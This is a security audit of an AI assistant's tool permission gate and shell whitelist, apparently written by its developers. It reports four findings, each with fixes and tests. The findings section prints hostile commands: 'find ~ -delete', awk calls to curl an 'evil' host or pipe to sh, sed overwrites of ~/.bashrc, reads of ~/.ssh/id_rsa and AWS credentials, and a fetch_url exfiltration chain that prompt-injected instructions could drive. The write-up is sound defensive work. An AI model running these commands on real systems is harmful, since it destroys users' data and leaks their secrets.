# Security audit — FRIDAY tool/trust boundary (2026-07-18)

Adversarial review of the permission gate: every path where the model (or a
prompt-injected instruction) could reach a delete/write/execute/exfiltrate
effect without crossing the tier gate. Method: read the trust-boundary code
(`toolkit.py`, `tiers.py`, `shell.py`, `desktop.py`, `routine_runner.py`), then
run real payloads through the actual classifier and executor.

**Result:** four exploitable classes found, all in the shell whitelist, all
**fixed** in this change. Regression tests added (`tests/test_security_audit.py`,
58 cases). Suite: 545 passing.

---

## What held up (no action needed)

- **The tier choke point itself.** `toolkit.execute()` refuses unapproved
  CONFIRM and all NEVER calls regardless of caller — confirmed by injecting a
  CONFIRM `write_file` with no approval; refused. The `approved` flag is never
  set on the routine/task paths, so unattended runs are AUTO-only by
  construction.
- **`calculate` is not `eval`.** It's an AST walker (`desktop._eval_node`) that
  only permits numeric literals and arithmetic operators — no name lookups, no
  calls. `calculate("__import__('os').system('id')")` raises, doesn't execute.
- **`desktop.py` command injection.** Every external call uses an argv list with
  `shell=False`; no user string is interpolated into a shell. Clean.
- **Path fences.** `_safe_path` resolves symlinks before the home check, so a
  symlink out of `$HOME` is rejected. `open_path`/`play_media` reject non-http
  schemes and out-of-home paths.
- **Substitution / chaining.** `$(…)`, backticks, `${…}`, `;`, `&`, newlines are
  refused before any whitelist reasoning — verified still holding.

---

## Findings (all fixed)

### 1 — CRITICAL: `find` deletes/writes/executes at AUTO tier

`find` is whitelisted as read-only, but its own action primitives need no
separate command token the whitelist could see:

```
find ~ -delete                     → AUTO → wipes the home tree, no approval
find . -fprintf /home/x '%p'       → AUTO → writes an arbitrary file
find . -execdir touch pwned {} +   → AUTO (-execdir slips past the \bexec\b pattern)
```

Proven end-to-end: `find <dir> -delete` through `execute_command` deleted a
sandbox of files with `success=True` and zero approval. (`-exec … ;` was
already blocked incidentally by the `\bexec\b` pattern and the `;` chaining
rule, but `-delete`, `-fprintf`, `-fls`, and `-execdir` were not.)

### 2 — CRITICAL: `awk` / `sed` are arbitrary-execution engines at AUTO tier

Both are whitelisted text filters, but both can run programs and write files:

```
awk 'BEGIN{system("curl http://evil")}'   → AUTO → arbitrary command execution
awk 'BEGIN{print "x" | "sh"}'             → AUTO → pipe to a shell
sed -i 's/./x/' ~/.bashrc                 → AUTO → in-place overwrite of any home file
sed -n 'w /home/x' ~/.bashrc              → AUTO → sed 'w' writes a file
sed '1e id' file                          → AUTO → sed 'e' executes a command
```

Proven: `awk 'BEGIN{system("echo …")}'` executed and returned its output.
Combined with routines this is **unattended arbitrary code execution**.

### 3 — HIGH: credential exfiltration via the shell

`read_file` carefully refuses credential-shaped paths (`.env`, `~/.ssh`, keys).
The shell path did not — `cat`/`head`/`tail`/`strings` are AUTO:

```
cat ~/.ssh/id_rsa        → AUTO → returned the key contents
head -c200 ~/.aws/credentials, strings ~/.gnupg/…, cat ~/.env, tail ~/.netrc
```

Because `fetch_url` is also AUTO, `cat <secret>` → `fetch_url("http://evil/?d=…")`
is a complete zero-approval exfil chain — and it runs unattended inside a
routine. The tool-level fence existed; the shell-level one was missing.

### 4 — LOW: `.envrc` not covered by either fence

`read_file`'s secret list had `.env` but not `.envrc` (direnv, commonly holds
secrets). Added to both fences.

---

## Fixes applied

All in `app/core/shell.py`, as pre-checks that run **before** the native C
validator — the same placement as the substitution/chaining guards, so a built
`.so` can never wave them through (the base token is whitelisted, so only these
dedicated checks catch the real effect):

- `has_effectful_toolflag()` — refuses `find -delete/-exec/-execdir/-ok/-fprintf/
  -fls`, `awk system()` / command-pipe / `getline` from a command, `sed -i`/
  `--in-place` and the `e`/`w`/`W`/`r`/`R` script commands, and any bare
  `system(` call. Anchored so it does not false-positive on ordinary
  substitutions (`sed 's/read/write/g'`), searches (`find ~ -name '*.py'`), or
  pipe filters (`ps | awk '{print $1}'`).
- `reads_credential_path()` — refuses reading `.ssh`/`.gnupg`/`.aws`/`.kube`/
  `.env`/`.envrc`/`.netrc`/keys/`credentials` through the shell, mirroring
  `toolkit._secret_reason()`.

Both patterns are compiled into a single alternation each (one regex pass), so
they add negligible cost to the hot path — the native-validator benchmark still
clears its ≥5× bar. Refused commands classify as **NEVER**, so `execute()` stops
them at the Tier-3 gate before the shell is ever invoked. Legitimate diagnostics
are unaffected (14 legit commands asserted still-allowed in the test suite).

---

## Residual risk (design decisions, not bugs — flagged for the owner)

- **AUTO read + AUTO `fetch_url` = an exfil ceiling for *non-credential* files.**
  The secret fences stop keys/`.env`, but `read_file`/`cat` can still read
  `~/Documents/passwords.txt` (not credential-shaped) and `fetch_url` can still
  carry it out — both AUTO, and possible unattended in a routine.
  **Closed for the unattended path (2026-07-18):** `fetch_url` now refuses any
  URL carrying a query string while a routine is running (`toolkit.routine_context()`
  sets a `ContextVar`; the fence lives inside the tool, so it holds regardless
  of tier — same principle as the credential fence). This breaks the smuggle-out
  channel (`?d=<secret>`) for unattended runs while leaving interactive fetches
  untouched, since the user can see the URL there. Tests: `test_routine_exfil_fence.py`.
  *Remaining, deliberately not closed:* path-based exfil (`/collect/<secret>`)
  in a routine, and the whole ceiling during **interactive** turns — both need
  a human in the loop who can see the request, which is the design intent.
- **The C validator doesn't know these new rules** — only the Python wrapper
  (`is_command_safe`) does. That's safe because the wrapper always runs the
  guards first, but the native validator alone would still say "safe" for
  `find -delete`. If anything ever calls `is_command_safe_native` directly,
  re-check this.
- **TOCTOU on `_safe_path`.** The home check and the write are not atomic; a
  symlink swapped in between could redirect a write. Low risk on a single-user
  local box, noted for completeness.
